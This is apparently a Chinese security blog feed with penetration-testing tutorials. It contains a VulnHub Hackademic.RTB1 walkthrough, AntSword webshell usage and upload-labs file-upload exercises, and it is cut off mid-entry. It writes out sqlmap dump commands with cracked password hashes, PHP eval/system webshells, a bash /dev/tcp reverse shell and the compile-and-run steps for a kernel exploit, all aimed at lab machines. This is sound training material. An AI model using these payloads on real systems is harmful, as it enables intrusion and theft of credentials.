alt="image.png"><br>为什么称之为完整的shell，主要是在vim进行编辑时的区别：<br>完整的shell能够正常的按esc，：进行退出就和kali虚拟机的vim编辑器一样。<br>如果没有进行提升，退出就会导致出现这样的结果。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705148180240-6f328832-88a5-4e87-95e1-f55ac523a321.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> 正反向shell </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 正反向shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hackademic.RTB1靶机通关教程</title>
      <link href="/2024/01/13/Hackademic-RTB1%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/"/>
      <url>/2024/01/13/Hackademic-RTB1%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="一-环境搭建"><a href="#一-环境搭建" class="headerlink" title="一.环境搭建:"></a>一.环境搭建:</h1><h2 id="1-下载Hackademinc-RTB1的靶机"><a href="#1-下载Hackademinc-RTB1的靶机" class="headerlink" title="1.下载Hackademinc.RTB1的靶机:"></a>1.下载Hackademinc.RTB1的靶机:</h2><p>下载地址:<a href="https://www.vulnhub.com/entry/hackademic-rtb1,17/%E6%88%96%E8%80%85[http://192.168.2.6:5244/d/%E7%BD%91%E7%9B%98/%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98/%E9%95%9C%E5%83%8F%E5%A4%A7%E5%85%A8/%E9%9D%B6%E6%9C%BA/Hackademic.RTB1.zip](http://192.168.2.6:5244/d/%E7%BD%91%E7%9B%98/%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98/%E9%95%9C%E5%83%8F%E5%A4%A7%E5%85%A8/%E9%9D%B6%E6%9C%BA/Hackademic.RTB1.zip)">https://www.vulnhub.com/entry/hackademic-rtb1,17/或者[http://192.168.2.6:5244/d/%E7%BD%91%E7%9B%98/%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98/%E9%95%9C%E5%83%8F%E5%A4%A7%E5%85%A8/%E9%9D%B6%E6%9C%BA/Hackademic.RTB1.zip](http://192.168.2.6:5244/d/%E7%BD%91%E7%9B%98/%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98/%E9%95%9C%E5%83%8F%E5%A4%A7%E5%85%A8/%E9%9D%B6%E6%9C%BA/Hackademic.RTB1.zip)</a><br>下载完成之后并解压到指定路径。</p><h2 id="2-在VMare虚拟机中打开"><a href="#2-在VMare虚拟机中打开" class="headerlink" title="2.在VMare虚拟机中打开"></a>2.在VMare虚拟机中打开</h2><p>打开vmare虚拟机点击文件,打开找到解压的vmdk文件导入就可以了</p><h2 id="3-查看Hackademinc-RTB1的mac地址并进行记录："><a href="#3-查看Hackademinc-RTB1的mac地址并进行记录：" class="headerlink" title="3.查看Hackademinc.RTB1的mac地址并进行记录："></a>3.查看Hackademinc.RTB1的mac地址并进行记录：</h2><p>网络适配器选择NAT，点击高级查看mac地址：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705130888271-1ff54eca-fc5b-424e-929f-84996a138ec1.png" alt="image.png"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Hackademinc.RTB1的mac地址：<span class="number">00</span>:<span class="number">0</span>C:<span class="number">29</span>:<span class="number">15</span>:FE:<span class="number">7</span>C</span><br></pre></td></tr></table></figure><p>之后对kali虚拟机进行网络配置，同样选择NAT模式<br>用ifconfig查看kali虚拟机的IP地址<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705131184056-5b35e74d-deab-471c-986a-fa4a3a23574c.png" alt="image.png"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">kali虚拟机的ip：<span class="number">192.168</span>.<span class="number">13.130</span></span><br></pre></td></tr></table></figure><p>由于两台虚拟机均是NAT模式，尝试通过arp的相关命令通过端口查找Hackademic.RTB1与之对应的IP地址。<br>命令为：<strong>arp-scan -l(L是小写) -i(这里i是大写) eth0 #通过arp来确定eth0的网段有哪些主机，也就是使用 arp-scan 应用程序扫描局域网中的设备，使用网络接口 eth0 进行扫描。-表示的是列举，-i eth0表明了要使用的网络接口</strong><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705131543287-2c1fbc30-d08a-496d-800c-b45834250f0c.png" alt="image.png"></p><h1 id="二-开始打靶："><a href="#二-开始打靶：" class="headerlink" title="二.开始打靶："></a>二.开始打靶：</h1><h2 id="1-端口扫描："><a href="#1-端口扫描：" class="headerlink" title="1.端口扫描："></a>1.端口扫描：</h2><p><strong>nmap -p- 192.168.13.135</strong><br><strong>nmap -p 20,80    -sV   -O -sC 192.168.13.135#sV查看服务版本，-O查看操作系统</strong><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705131972795-743fcb4d-d1bb-4f62-a7a7-5f33901d68a1.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705133103934-7306062a-0ff1-47f2-822b-c4167a565dfb.png" alt="image.png"><br>可以看出该虚拟机预测的系统以及版本。</p><h2 id="2-从网页查找信息："><a href="#2-从网页查找信息：" class="headerlink" title="2.从网页查找信息："></a>2.从网页查找信息：</h2><p>从上述端口扫描可以看出，ssh服务是关闭的，本地的端口是开启的，可以将IP地址用浏览器打开，出现如下界面<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705133355263-69dd4f88-f8e3-43a6-9f86-06cf27b2e738.png" alt="image.png"><br>点击target出现新的目录<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40666686/1705133531951-99e38107-c4f8-42a6-9acb-037f0e818eb6.png#averageHue=%23e8e5e5&clientId=u0e7ae00e-ff2e-4&from=paste&height=433&id=u88767205&originHeight=541&originWidth=823&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=100858&status=done&style=none&taskId=uc322942f-111f-4c8b-ad71-a1b52775bdf&title=&width=658.4" alt="image.png"></p><h2 id="3-目录扫描"><a href="#3-目录扫描" class="headerlink" title="3.目录扫描"></a>3.目录扫描</h2><p><strong>dirsearch -u “192.168.13.135&#x2F;Hackademic_RTB1” -x 404,403</strong><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705134120430-90d9792b-cfbf-4e05-a7bf-0ae3ab3dcf2e.png" alt="image.png"><br>通过目录查看到网站根目录下存在wp-xxxx的目录，判断可能WordPress程序进行搭建，同时网站根目录下存在wp-admin文件夹，而这个文件夹通常表示该网站使用了WordPress内容管理系统（CMS）。wp-admin是WordPress的后台管理页面目录，它包含网站管理者进行网站设置、添加内容和管理用户等操作所需的文件和页面。因此，发现wp-admin文件夹可以推断出该网站是使用WordPress搭建的。</p><h2 id="4-网页中的sql注入："><a href="#4-网页中的sql注入：" class="headerlink" title="4.网页中的sql注入："></a>4.网页中的sql注入：</h2><h3 id="1-查找注入点："><a href="#1-查找注入点：" class="headerlink" title="1.查找注入点："></a>1.查找注入点：</h3><p>点击Got root，发现?p&#x3D;9可能存在注入点<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705134245186-1a85cb28-94be-4d18-9bc3-920b90a9b4f8.png" alt="image.png"><br>之后对p&#x3D;9进行sql注入发现没有变化<br>点击uncartegoried发现?cat&#x3D;1可能存在注入<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705134405766-52cc5683-97ad-4459-9f1a-902bdbf51675.png" alt="image.png"><br>用?cat&#x3D;1’进行尝试发现报错<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705134548432-51cfed84-f7af-4bcc-abc4-89d76bc53181.png" alt="image.png"></p><h3 id="2-直接用sqlmap去操作："><a href="#2-直接用sqlmap去操作：" class="headerlink" title="2.直接用sqlmap去操作："></a>2.直接用sqlmap去操作：</h3><p>爆库：<br><strong>python sqlmap.py -u “</strong><a href="http://192.168.13.135/Hackademic_RTB1/?cat=1%22"><strong>http://192.168.13.135/Hackademic_RTB1&#x2F;?cat&#x3D;1”</strong></a>**  –dbs –batch**<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705134816244-98456ac9-5c91-4246-9589-c11fe0931e0c.png" alt="image.png"><br>mysql和information_schema是mysql5.0之后存在的库，所以可以直接对wordpress进行操作。<br>爆表：<br><strong>python sqlmap.py -u “</strong><a href="http://192.168.13.135/Hackademic_RTB1/?cat=1%22"><strong>http://192.168.13.135/Hackademic_RTB1&#x2F;?cat&#x3D;1”</strong></a>**  -D wordpress –tables**<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705135245590-78200216-0d37-4ec8-831c-35defe1c43d9.png" alt="image.png"><br>爆值：<br><strong>python sqlmap.py -u “</strong><a href="http://192.168.13.135/Hackademic_RTB1/?cat=1%22"><strong>http://192.168.13.135/Hackademic_RTB1&#x2F;?cat&#x3D;1”</strong></a>**  -D wordpress -T wp_users –dump**</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">+----+---------+----------+----------+----------+----------+----------+---------------------------------------------+-------------------------+------------+--------------+-------------+-------------+-------------+--------------+---------------+---------------+---------------+----------------+---------------------+------------------+---------------------+</span><br><span class="line">| ID | user_ip | user_aim | user_icq | user_msn | user_url | user_yim | user_pass                                   | user_email              | user_level | user_login   | user_domain | user_idmode | user_status | user_browser | user_lastname | user_nicename | user_nickname | user_firstname | user_registered     | user_description | user_activation_key |</span><br><span class="line">+----+---------+----------+----------+----------+----------+----------+---------------------------------------------+-------------------------+------------+--------------+-------------+-------------+-------------+--------------+---------------+---------------+---------------+----------------+---------------------+------------------+---------------------+</span><br><span class="line">| <span class="number">1</span>  | &lt;blank&gt; | &lt;blank&gt;  | <span class="number">0</span>        | &lt;blank&gt;  | http:<span class="comment">//  | &lt;blank&gt;  | 21232f297a57a5a743894a0e4a801fc3 (admin)    | NickJames@hacked.com    | 1          | NickJames    | &lt;blank&gt;     | login       | 0           | &lt;blank&gt;      | James         | nickjames     | NickJames     | Nick           | 2010-10-25 20:40:23 | &lt;blank&gt;          | &lt;blank&gt;             |</span></span><br><span class="line">| <span class="number">2</span>  | &lt;blank&gt; | &lt;blank&gt;  | <span class="number">0</span>        | &lt;blank&gt;  | http:<span class="comment">//  | &lt;blank&gt;  | b986448f0bb9e5e124ca91d3d650f52c            | JohnSmith@hacked        | 0          | JohnSmith    | &lt;blank&gt;     | login       | 0           | &lt;blank&gt;      | Smith         | johnsmith     | JohnSmith     | John           | 2010-10-25 21:25:22 | &lt;blank&gt;          | &lt;blank&gt;             |</span></span><br><span class="line">| <span class="number">3</span>  | &lt;blank&gt; | &lt;blank&gt;  | <span class="number">0</span>        | &lt;blank&gt;  | http:<span class="comment">//  | &lt;blank&gt;  | 7cbb3252ba6b7e9c422fac5334d22054 (q1w2e3)   | GeorgeMiller@hacked.com | 10         | GeorgeMiller | &lt;blank&gt;     | nickname    | 0           | &lt;blank&gt;      | Miller        | georgemiller  | GeorgeMiller  | George         | 2011-01-07 03:08:51 | &lt;blank&gt;          | &lt;blank&gt;             |</span></span><br><span class="line">| <span class="number">4</span>  | &lt;blank&gt; | &lt;blank&gt;  | <span class="number">0</span>        | &lt;blank&gt;  | http:<span class="comment">//  | &lt;blank&gt;  | a6e514f9486b83cb53d8d932f9a04292 (napoleon) | TonyBlack@hacked.com    | 0          | TonyBlack    | &lt;blank&gt;     | nickname    | 0           | &lt;blank&gt;      | Black         | tonyblack     | TonyBlack     | Tony           | 2011-01-07 03:09:55 | &lt;blank&gt;          | &lt;blank&gt;             |</span></span><br><span class="line">| <span class="number">5</span>  | &lt;blank&gt; | &lt;blank&gt;  | <span class="number">0</span>        | &lt;blank&gt;  | http:<span class="comment">//  | &lt;blank&gt;  | 8601f6e1028a8e8a966f6c33fcd9aec4 (maxwell)  | JasonKonnors@hacked.com | 0          | JasonKonnors | &lt;blank&gt;     | nickname    | 0           | &lt;blank&gt;      | Konnors       | jasonkonnors  | JasonKonnors  | Jason          | 2011-01-07 03:10:36 | &lt;blank&gt;          | &lt;blank&gt;             |</span></span><br><span class="line">| <span class="number">6</span>  | &lt;blank&gt; | &lt;blank&gt;  | <span class="number">0</span>        | &lt;blank&gt;  | http:<span class="comment">//  | &lt;blank&gt;  | 50484c19f1afdaf3841a0d821ed393d2 (kernel)   | MaxBucky@hacked.com     | 0          | MaxBucky     | &lt;blank&gt;     | nickname    | 0           | &lt;blank&gt;      | Bucky         | maxbucky      | MaxBucky      | Max            | 2011-01-07 03:11:18 | &lt;blank&gt;          | &lt;blank&gt;             |</span></span><br><span class="line">+----+---------+----------+----------+----------+----------+----------+---------------------------------------------+-------------------------+------------+--------------+-------------+-------------+-------------+--------------+---------------+---------------+---------------+----------------+---------------------+------------------+---------------------+</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705136070128-d4f8d57b-770f-4626-bd1d-3aef655873a4.png" alt="image.png"><br>也可以通过-C选择部分的列进行展示:<strong>python sqlmap.py -u “</strong><a href="http://192.168.13.135/Hackademic_RTB1/?cat=1%22"><strong>http://192.168.13.135/Hackademic_RTB1&#x2F;?cat&#x3D;1”</strong></a>**  -D wordpress -T wp_users -C “ID,user_pass,user_email,user_level,user_lastname,user_nicename,user_firstname” –dump**<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705136369270-2fda74a2-de0c-47a6-be5b-28d2fc3f964a.png" alt="image.png"></p><h1 id="三-尝试登录后台进行文件上传"><a href="#三-尝试登录后台进行文件上传" class="headerlink" title="三.尝试登录后台进行文件上传:"></a>三.尝试登录后台进行文件上传:</h1><p>目录扫描时发现了wp-admin用浏览器进行登录:<br>一个个密码,账号进行尝试,最后发现GeorgeMiller这个账户能够登陆成功。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705136709642-f4b28dc1-5cac-4c98-a53e-9fbc0095313c.png" alt="image.png"><br>一个个进行点击尝试发现在manage下面存在可编辑文件file<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705136924219-aebf6cc5-9e9e-404b-859d-a472f483a6c6.png" alt="image.png"><br>用**phpinfo();**判断是否能够直接上马<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705137217700-1f17e0d5-e7e9-4aee-96cd-e7d67e66bfd3.png" alt="image.png"><br>判断成功可以上马，之后用蚁剑的木马进行尝试：<br><strong>@eval($_POST[a]);</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[a]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>进行连接，连接成功<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705137462387-04f98c4b-df0e-4f97-ad51-99c98dfafb7b.png" alt="image.png"><br>也可以通过options设置为允许php文件的上传，最后点击右下角update options即可进行文件上传。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705137785156-d1879117-d5b6-4767-85b3-3c22d13bed43.png" alt="image.png"><br>用蚁剑登录之后查看权限：<br><strong>whoami</strong>#apache是个服务权限，权限较低<br><strong>id</strong><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705138595894-b82209db-9e6a-4f62-a84e-d54cfd08336a.png" alt="image.png"></p><h1 id="四-内核提权："><a href="#四-内核提权：" class="headerlink" title="四.内核提权："></a>四.内核提权：</h1><p><strong>nc -nvlp 4444</strong>:这一步是在kali虚拟机中，因为要实现的是一个反弹shell，将蚁剑上的命令行窗口转移到kuli虚拟机上。<br>nc -nvlp 4444#用于在端口 4444 上启动一个监听器，以侦听来自网络上某个客户端的连接。nc是一个工具，只要是tcp的端口都能进行连接。-nvlp来监听本地。<br>这一步是在蚁剑得命令行中进行的操作：<br><strong>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.13.130&#x2F;4444 0&gt;&amp;1</strong><br>#这个命令是一个 Bash 一句话反弹 shell 的 Payload，它会尝试与指定的 IP 地址和端口建立反向 shell 连接。<br>具体来说，这个命令中的 bash -i 表示以交互模式运行 Bash shell，&gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.13.130&#x2F;4444 表示将标准输出和标准错误重定向到指定的 IP 地址和端口上，并且 0&gt;&amp;1 表示将标准输入指向标准输出，以便确保交互性输入。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705139624809-6b22ff5e-711a-4f54-b59d-7d74b8af5fc2.png" alt="image.png"><br>之后又会重新弹出一个新的bash。是与之前的bash是相互隔离的。<br>输入dir能够正常显示目录就是成功了。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705139675008-24710dab-63d0-429d-a943-25e2f9768745.png" alt="image.png"><br><strong>python -c ‘import pty; pty.spawn(“&#x2F;bin&#x2F;bash”)’</strong><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705142319129-4cb18a3b-868c-4a90-b5c8-3b224bfe2d22.png" alt="image.png"></p><p>这行命令获得一个稍微强点的会话。通过这个命令直接使之前的半交互式换成了全交互式的bash。这条命令将启动一个交互式的 Bash shell，然后通过 Python 的 -c 参数直接执行了一行 Python 代码。在这行代码中，import pty 用于导入 Python 的 pty 模块，pty.spawn(“&#x2F;bin&#x2F;bash”) 用于利用伪终端（pty）来启动一个交互式的 Bash shell。</p><p>当在命令行中执行这条命令时，它会创建一个新的交互式的 Bash shell，能够以交互式的方式与系统进行通信，就好像使用了真正的终端一样。<br>这种方法通常用于绕过一些限制性的 shell，比如在一个受限的 shell 中时，可以通过这种方式获取一个更加灵活的交互式 shell。<br><strong>uname -a</strong>#查看内核版本，这个同样是在反弹的shell中进行输入<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705140376036-b129674c-2d2e-47e3-b51f-7bb846896d31.png" alt="image.png"><br><strong>searchsploit 2.6.3|grep local</strong>#退出反弹shell之后进行输入<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705140434735-c04a2210-438e-4595-b831-f45b9d2f463b.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/40666686/1705140616795-3933e1b4-29fe-4866-aa56-2508588bdafb.png#averageHue=%23e3e4e3&clientId=u92113783-4bd5-4&from=paste&height=42&id=uc8b4ad2a&originHeight=52&originWidth=702&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=18645&status=done&style=none&taskId=ue13e26af-16fd-4b89-a350-98842e7f9cb&title=&width=561.6" alt="image.png"><br>locate 15285.c#全局检索<br>也可以通过<strong>find &#x2F; -name grep|local linux</strong>进行查找路径<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705140756805-3c18ed2a-5752-4062-ad2d-9312b706df12.png" alt="image.png"><br>复制到当前目录下<br> <strong>cp &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;15285.c .</strong><br>ls进行查看<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705140951769-aff44be4-1c5a-4528-a8ca-86f12ecf66ad.png" alt="image.png"><br>然后将15285.c复制到蚁剑目录下的tmp目录下面<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705141392171-b43bf166-cb84-446b-9f7e-a8bd0fecff8d.png" alt="image.png"></p><p><strong>cd &#x2F;tmp</strong>#切换到根目录下的tmp目录<br><strong>ls</strong><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705141919393-f8570341-ac54-4362-83a4-d850e33a7cc5.png" alt="image.png"><br><strong>gcc 15285.c -o exp</strong>#gcc 是 C 语言的编译器，用于将 C 语言源代码转换成可执行文件。编译一个名为 “15285.c” 的 C 语言源文件，并将生成的可执行文件命名为 “exp”，-o 参数用于指定输出文件的名称。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705142028897-fc5ea418-e8d9-46ef-a448-266ca0174ca4.png" alt="image.png"><br><strong>chmod +x .&#x2F;exp</strong>#赋予执行权限给当前目录下的exp文件<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705142254918-eec9a12c-f0ec-47da-98f3-ba3cd5e1c64e.png" alt="image.png"><br><strong>.&#x2F;exp#执行exp文件</strong><br><strong>whoami#查看当前身份</strong><br><strong>id#查看当前用户id</strong><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705142417999-5d7eed29-e13f-4b55-a1a3-e57de62727c8.png" alt="image.png"><br>最后发现提权成功。</p><h1 id="五-获得key："><a href="#五-获得key：" class="headerlink" title="五.获得key："></a>五.获得key：</h1><p><strong>cd &#x2F;root#切换到root用户</strong><br><strong>ls#查看文件</strong><br><strong>cat key.txt#查看key.txt</strong><br><strong>cat key.txt~</strong><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1705142711577-72e89ff9-f4bc-4a50-9383-86cc89d9db03.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> 靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hackademinc.RTB1靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>蚁剑webshell管理工具的使用</title>
      <link href="/2024/01/13/%E8%9A%81%E5%89%91webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
      <url>/2024/01/13/%E8%9A%81%E5%89%91webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="一-写一个简单的蚁剑的websell脚本："><a href="#一-写一个简单的蚁剑的websell脚本：" class="headerlink" title="一.写一个简单的蚁剑的websell脚本："></a>一.写一个简单的蚁剑的websell脚本：</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[a]); <span class="comment">#a是密码,eval是代码执行函数 </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">systen是命令执行函数</span><br></pre></td></tr></table></figure><h1 id="二-获取链接："><a href="#二-获取链接：" class="headerlink" title="二.获取链接："></a>二.获取链接：</h1><p>以第一关为例<br>禁掉js之后上传木马就可以了，之后复制上传成功图片的路径<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704985475221-9ff59855-6bcf-4d5d-abb3-c360b3ea1aba.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704985542165-c4a4366d-8b99-42d9-9326-0f9cb5bcecc8.png" alt="image.png"><br>上传成功。获得地址为<a href="http://192.168.13.128/upload-labs-master/upload/tfk.php">http://192.168.13.128/upload-labs-master/upload/tfk.php</a><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704987599401-78e88f4f-a3d0-43d6-8fd6-ea763b98490c.png" alt="image.png"></p><h1 id="三-用postman进行测试"><a href="#三-用postman进行测试" class="headerlink" title="三.用postman进行测试:"></a>三.用postman进行测试:</h1><p>打开postman，请求方式选择post请求，之后选择body，form-data，key输入a，value输入system(dir);<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704988489314-34bd4f7b-fd97-4baf-8254-6c487bcafd10.png" alt="image.png"></p><h1 id="四-连接："><a href="#四-连接：" class="headerlink" title="四. 连接："></a>四. 连接：</h1><p>打开kali linux虚拟机中的蚁剑:<br>这里记录一下如何打开蚁剑的目录：&#x2F;root&#x2F;AntSword&#x2F;AntSword-Loader-v4.0.3-linux-x64&#x2F;<br>双击打开就可以成功运行蚁剑：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704985833440-eebe87e0-630c-4d4c-a333-4e5db9c10eef.png" alt="image.png"><br>进去之后应该是空的，右键进行添加数据<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704989699021-3d562078-dd93-4bb8-981c-075694f88d92.png" alt="image.png"><br>URL地址就是刚刚上传成功之后木马的地址，密码就是a。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704989673311-a650da38-d334-4e9d-aaea-969cf41b436f.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> 蚁剑工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 蚁剑工具的使用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传漏洞</title>
      <link href="/2024/01/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
      <url>/2024/01/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="一-目录"><a href="#一-目录" class="headerlink" title="一.目录:"></a>一.目录:</h1><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704894637977-394a30aa-464d-4dfe-877c-58d6d4790e13.png" alt="image.png"></p><h1 id="二-什么是文件上传漏洞"><a href="#二-什么是文件上传漏洞" class="headerlink" title="二:什么是文件上传漏洞:"></a>二:什么是文件上传漏洞:</h1><p>文件上传漏洞是一种常见的安全漏洞，发生在允许用户上传文件的应用程序中。这类漏洞可能会允许攻击者上传恶意文件，例如包含恶意代码的脚本文件、恶意软件或具有危害性的文件。一旦恶意文件上传成功并被服务器接受，攻击者就可以利用这些文件来执行进一步的攻击，如执行任意代码、访问敏感数据、入侵服务器等。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704894733775-295f534c-2eca-4e0c-906d-2923d10551db.png" alt="image.png"></p><h1 id="三-webshell"><a href="#三-webshell" class="headerlink" title="三.webshell"></a>三.webshell</h1><p>统一的上传木马是webshell,基于web页面对应语言的控制代码,在命令行所介绍的就是exe </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[a]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这行代码的含义是一个典型的 PHP 代码执行漏洞示例。它使用了 PHP 中的 system 函数来执行系统命令，而且直接从用户的 HTTP 请求参数中获取命令字符串，这意味着攻击者可以构造特定的 URL 请求，将恶意命令作为参数传递，从而实现对服务器的远程命令执行。<br>具体来说，这行代码中 “@system($_GET[a]);” 的含义是：当客户端通过 GET 请求传递参数 “a” 时，将该参数传递给 system 函数执行，而 “@” 符号表示忽略错误信息，这样即使执行命令时发生错误也不会抛出错误信息。这种做法非常危险，因为攻击者可以通过构造恶意的参数值，执行任意系统命令，比如删除文件、植入后门等恶意操作。</p><h1 id="四-upload-labs-master靶场的练习："><a href="#四-upload-labs-master靶场的练习：" class="headerlink" title="四.upload-labs-master靶场的练习："></a>四.upload-labs-master靶场的练习：</h1><h2 id="1-下载"><a href="#1-下载" class="headerlink" title="1.下载:"></a>1.下载:</h2><p>upload-labs-master的压缩包,只是个上传点的靶场。<br><a href="https://www.yuque.com/attachments/yuque/0/2024/zip/40666686/1704768464519-90f9186c-eaa7-4860-be74-a037c65b79df.zip?_lake_card=%7B%22src%22:%22https://www.yuque.com/attachments/yuque/0/2024/zip/40666686/1704768464519-90f9186c-eaa7-4860-be74-a037c65b79df.zip%22,%22name%22:%22upload-labs-master.zip%22,%22size%22:674173,%22ext%22:%22zip%22,%22source%22:%22%22,%22status%22:%22done%22,%22download%22:true,%22taskId%22:%22u2aebccd1-7e35-4b67-9e02-9da76bff11b%22,%22taskType%22:%22upload%22,%22type%22:%22application/x-zip-compressed%22,%22__spacing%22:%22both%22,%22mode%22:%22title%22,%22id%22:%22u55f0049f%22,%22margin%22:%7B%22top%22:true,%22bottom%22:true%7D,%22card%22:%22file%22%7D">upload-labs-master.zip</a><br>解压到phpstudy的根目录下。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704782912257-d2968797-0e04-49f2-b0a2-b7401fb38935.png" alt="image.png"></p><h2 id="2-打靶场："><a href="#2-打靶场：" class="headerlink" title="2.打靶场："></a>2.打靶场：</h2><h3 id="第一关："><a href="#第一关：" class="headerlink" title="第一关："></a>第一关：</h3><p>禁用js<br>上传第一件事关掉windows defender，点击这里会显示源码<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704896943049-46a797a2-1bcd-472d-bbd8-9c614fdd8cf3.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704769568332-3c2f3226-9fb0-4931-bfe6-fe15eb51ce57.png" alt="ec32fc7916ef69cd85c161cf45fd5be.png"></p><h3 id="第二关："><a href="#第二关：" class="headerlink" title="第二关："></a>第二关：</h3><p>查看源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line"> <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br></pre></td></tr></table></figure><p>通过 $_FILES[‘upload_file’][‘type’] 获取上传文件的 MIME 类型。<br>使用逻辑运算符 || (或) 检查上传文件的 MIME 类型是否为 ‘image&#x2F;jpeg’、‘image&#x2F;png’ 或 ‘image&#x2F;gif’。<br>如果上传文件的 MIME 类型匹配其中一个条件，表示上传文件是一个图像文件。<br>接下来的代码是使用 